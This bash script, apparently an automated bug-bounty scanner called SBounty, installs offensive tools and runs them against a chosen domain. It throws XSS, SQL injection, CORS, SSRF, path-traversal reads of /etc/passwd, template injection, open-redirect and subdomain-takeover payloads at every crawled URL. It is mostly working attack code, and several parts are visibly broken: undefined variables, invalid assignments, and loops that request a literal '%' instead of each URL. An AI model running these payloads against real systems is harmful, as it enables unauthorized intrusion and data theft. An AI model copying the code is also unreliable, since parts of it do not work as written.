#!/bin/bash

. config.ini

# TERM COLORS
bred='\033[1;31m'
bblue='\033[1;34m'
bgreen='\033[1;32m'
byellow='\033[1;33m'
bcyan='\033[1;36m'
red='\033[0;31m'
blue='\033[0;34m'
green='\033[0;32m'
yellow='\033[0;33m'
reset='\033[0m'

function banner(){
printf "\n${bcyan}"
printf " ____  ____                    _             \n"
printf "/ ___|| __ )  ___  _   _ _ __ | |_ _   _     \n"
printf "\___ \|  _ \ / _ \| | | | '_ \| __| | | |    \n" 
printf " ___) | |_) | (_) | |_| | | | | |_| |_| |    \n"
printf "|____/|____/ \___/ \__,_|_| |_|\__|\__, |    \n"
printf "                                   |___/     \n"
printf "                                by Shockz${reset}\n"
}

function help(){
    printf "#################################\n"
	printf "Usage: $0 [-s subdomain] [-t] \n"
    printf " \n"
    printf " ${bblue}TARGET OPTIONS${reset}\n"
	printf "   -s subdomain      Target subdomain\n"
    printf " \n"
    printf " ${bblue}MODE OPTIONS${reset}\n"
    printf "   -t                Subdomain Takeover - Perform a subdomain takeover check\n"
    printf "   -h                Help - Show this help\n"
    printf " \n"
	printf " ${bblue}USAGE EXAMPLES${reset}\n"
	printf " ./sbounty.sh -s tesla.com\n"
    printf " ./sbounty.sh -s www.tesla.com\n"
    printf " ./sbounty.sh -s https://www.tesla.com\n"
    printf " ./sbounty.sh -s 127.0.0.1:8080\n"
	printf " \n"
    printf " Subdomain Takeover check:\n"
    printf " ./sbounty.sh -s www.tesla.com -t \n"
    printf " \n"
    printf "#################################\n"
}

function out(){
    printf "\n"
    help
    exit
}

function install(){

    printf "\n\n${bgreen}#######################################################################${reset}\n"
    printf "${bblue} Checking and installing tools ${reset}\n\n"

    if ! dpkg -s sqlmap &> /dev/null; then
        sudo apt install sqlmap -y
    fi

    if ! [[ $(eval type go 2>/dev/null | grep -o 'go is') == "go is" ]] && [[ "$version" = $(go version 2>/dev/null | cut -d " " -f3) ]];then
        # Instalacion de go
        version=$(curl -L -s https://golang.org/VERSION?m=text)
        wget https://dl.google.com/go/${version}.linux-amd64.tar.gz > /dev/null 2>&1
        tar -C /usr/local -xzf ${version}.linux-amd64.tar.gz
        ln -sf /usr/local/go/bin/go /usr/local/bin/
        rm -rf $version*
        export GOROOT=/usr/local/go
        export GOPATH=$HOME/go
        export PATH=$GOPATH/bin:$GOROOT/bin:$HOME/.local/bin:$PATH
        profile_shell=".$(basename $(echo $SHELL))rc"
cat << EOF >> ~/"${profile_shell}"
# Golang vars
export GOROOT=/usr/local/go
export GOPATH=\$HOME/go
export PATH=\$GOPATH/bin:\$GOROOT/bin:\$HOME/.local/bin:\$PATH
EOF
        printf "${yellow} Golang installed ${reset}\n"
    fi

    if [ ! -d ~/.gf ];then
        git clone https://github.com/1ndianl33t/Gf-Patterns > /dev/null 2>&1
        mkdir ~/.gf
        mv ~/Gf-Patterns/*.json ~/.gf > /dev/null 2>&1
        printf "${yellow} GF-Patterns installed ${reset}\n"
    fi

    allinstalled=true
    
	which waybackurls &>/dev/null || allinstalled=false;
	which gf &>/dev/null || allinstalled=false;
	which qsreplace &>/dev/null || allinstalled=false;
	which rush &>/dev/null || allinstalled=false;
    which freq &>/dev/null || allinstalled=false;
    which subjack &>/dev/null || allinstalled=false;
    which httpx &>/dev/null || allinstalled=false;
    which gauplus &>/dev/null || allinstalled=false;
    which uro &>/dev/null || allinstalled=false;
    

    if [ "${allinstalled}" = true ]; then
		printf "${bgreen} Good! All installed! ${reset}\n\n"
	else

        go env -w GO111MODULE=auto
        go_step=0

		declare -A gotools
        gotools["gf"]="go install -v github.com/tomnomnom/gf@latest"
        gotools["qsreplace"]="go install -v github.com/tomnomnom/qsreplace@latest"
        gotools["waybackurls"]="go install -v github.com/tomnomnom/waybackurls@latest"
        gotools["httpx"]="go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"
        gotools["gauplus"]="go install github.com/bp0lr/gauplus@latest"
        gotools["rush"]="go install github.com/shenwei356/rush@latest"
        gotools["freq"]="go install github.com/takshal/freq@latest"

        for gotool in "${!gotools[@]}"; do
            go_step=$((go_step + 1))
            eval ${gotools[$gotool]} &>/dev/null
            exit_status=$?
            if [ $exit_status -eq 0 ]
            then
                printf "${yellow} $gotool installed ${reset}\n"
            else
                printf "${red} Unable to install $gotool, try manually ${reset}\n"
            fi
        done

        sudo apt install subjack -y > /dev/null 2>&1
        printf "${yellow} Subjack installed ${reset}\n"

        pip3 install uro > /dev/null 2>&1
        printf "${yellow} Uro installed ${reset}\n"
	fi
}

## Reflected XSS

function reflected_xss(){
    printf "\n${bblue}[**]${reset} Reflected XSS ${bblue}[**]${reset}\n"
    output="$results_path/xss.txt"
    cat /dev/null > $output
    found=false

    while read -r parameter; do
        printf "\n${bgreen}[*]${reset} Payload: $parameter\n"

        gf xss < $urls_output_path | qsreplace "$parameter" | freq | tee -a $output | grep "31m"

        if grep -q "31m" $output; then
            found=true
            break
        fi
    done < xss_payloads.txt

    if ! $found;then
        printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
    fi
}

## SQLI
function sqli(){
    output_urls="$results_path/sqli_urls.txt"
    output="$results_path/sqli.txt"
    cat /dev/null > $output_urls
    cat /dev/null > $output
    printf "\n${bblue}[**]${reset} SQL Injection ${bblue}[**]${reset}\n"

    gf sqli < $urls_output_path >> $output_urls; sqlmap -m $output_urls --batch -v 0 --flush-session --random-agent --level 1 --dbs --tamper=space2comment --random-agent | tee -a $output

    if ! grep -q "available databases" $output ;then
        printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
    fi

}

## CORS
function cors(){
    output="$results_path/cors.txt"
    cat /dev/null > $output
    payloads=("!" "(" ")" "'" ";" "=" "^" "{" "}" "|" "~" '"' '`' "," "%60" "%0b")
    found=false
    printf "\n${bblue}[**]${reset} CORS ${bblue}[**]${reset}\n"
    
    while read url;do for payload in ${payloads[*]}; do target=$(curl -s -I -H "Origin: $site$payload.evil.com" -X GET "$site") | if grep '$site$payload.evil.com'; then printf "${bred}[Potentional CORS Found] $url ${reset}" | tee -a $output ; $found=true; else echo "Nothing on $url" > $output ;fi;done;done < $urls_output_path

    if ! $found;then
        printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
    fi
}

## SSRF
function ssrf(){
    output="$results_path/ssrf.txt"
    cat /dev/null > $output
    printf "\n${bblue}[**]${reset} SSRF ${bblue}[**]${reset}\n"

    grep "=" < $urls_output_path | qsreplace $burpcollaborator | rush -j40 'if curl -skL "{}" -o /dev/null -H "CF-Connecting_IP: $burpcollaborator" -H "From: root@$burpcollaborator" -H "Client-IP: $burpcollaborator" -H "X-Client-IP: $burpcollaborator" -H "X-Forwarded-For: $burpcollaborator" -H "X-Wap-Profile: http://$burpcollaborator/wap.xml" -H "Forwarded: $burpcollaborator" -H "True-Client-IP: $burpcollaborator" -H "Contact: root@$burpcollaborator" -H "X-Originating-IP: $burpcollaborator" -H "X-Real-IP: $burpcollaborator"; then echo "{}"; fi' > $output
    printf "\n${byellow}[!]${reset} Check Burp Collaborator Poll\n"
}

## LFI
function lfi(){
    output="$results_path/lfi.txt"
    output_urls="$results_path/lfi_urls.txt"
    cat /dev/null > $output
    found=false
    printf "\n${bblue}[**]${reset} LFI ${bblue}[**]${reset}\n"

    gf lfi < $urls_output_path | qsreplace "../../../../../../../../etc/passwd" >> $output_urls;
    while read url;do curl -s "%" 2>&1 | grep -q "root:x" && printf "${bred}VULN! %${reset}" > $output && found=true  ;done < $output_urls

    if ! $found;then
        printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
    fi
}

## SSTI
function ssti(){
    local argumentos=$@
    output="$results_path/ssti.txt"
    output_urls="$results_path/ssti_urls.txt"
    cat /dev/null > $output
    found=false
    printf "\n${bblue}[**]${reset} SSTI ${bblue}[**]${reset}\n"

    URL=$(echo "$1" | httpx -silent); curl -s -X GET "$URL/%7B%7B9955%2A9955%7D%7D" 2>&1 | grep -q "99102025" && printf "${bred}VULNERABLE: $URL/{{9955*9955}}\n${reset}" && found=true

    gf ssti < $urls_output_path | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" >> $output_urls;

    while read url;do curl -s "%" 2>&1 | grep -q "root:x" && printf "${bred}VULN! %${reset}" > $output && found=true  ;done < $output_urls

    if ! $found;then
        printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
    fi
}

## Subdomain Takeover
function subdomain_takeover(){
    local argumentos=$@
    output="$results_path/takeover.txt"
    cat /dev/null > $output
    found=false

    printf "\n${bblue}[**]${reset} Subdomain Takeover ${bblue}[**]${reset}\n"
    
    subjack -d "$1" -a -ssl -t 100 | tee -a $output | grep -v "Vulnerable" && found=true

    if ! $found;then
        printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
    fi
}

## Open redirect
function open_redirect(){
    local argumentos=$@
    output="$results_path/open_redirect.txt"
    cat /dev/null > $output
    found=false

    printf "\n${bblue}[**]${reset} Open Redirect ${bblue}[**]${reset}\n"

    gf redirect < $urls_output_path | cut -f 3- -d ':' | qsreplace "https://evil.com" | httpx -silent -status-code -location | grep -q "Location: https://evil.com" && echo "${bred}VULN! %${breset}" && found=true

    if ! $found;then
        printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
    fi
}



###### SCRIPT STARTS HERE ######

# Singlemode
# Config vars
subdomain_takeover=false

PROGARGS=$(getopt -o "s:th" -- "$@")

if [ $? -ne 0 ]; then
  out
fi

eval set -- "$PROGARGS"
unset PROGARGS

while true; do
    case "$1" in
        '-s')
            if [[ "$(curl -L -s -o /dev/null -w "%{http_code}" $2)" != "200" ]]; then
                printf "${bred}[!]${reset} ERROR: Subdomain it's not alive\n"
                out
            fi
            subdomain=$2
            shift 2
            continue
            ;;
        '-t')
            subdomain_takeover=true
            shift
            continue
            ;;
        '--')
			shift
			break
		    ;;
        '-h'| *)
            out
		    ;;
    esac
done

results_path="results/$subdomain"
urls_output_path="$results_path/urls.txt"

if [[ $(id -u | grep -o '^0$') != "0" ]]; then
    printf "${bred} Please run as root or with user added to sudoers ${reset}\n\n"
    exit
fi

banner

install

if [ ! -d "$results_path" ]; then
  mkdir -p $results_path
fi

printf "${bgreen}[*]${reset} Here we go buddy!!\n"

printf "${bgreen}[*]${reset} Crawling and Finding URL's...\n"

#URLS
gauplus -random-agent -t 10 "$subdomain" | uro | httpx -silent -threads 100 > $urls_output_path

test "$xss" = "true" && reflected_xss
test "$sqli" = "true" && sqli
test "$cors" = "true" && cors
test "$ssrf" = "true" && ssrf
test "$lfi" = "true" && lfi
test "$ssti" = "true" && ssti "$subdomain"
test "$open_redirect" = "true" && open_redirect 
test "$subdomain_takeover" = "true" && subdomain_takeover "$subdomain"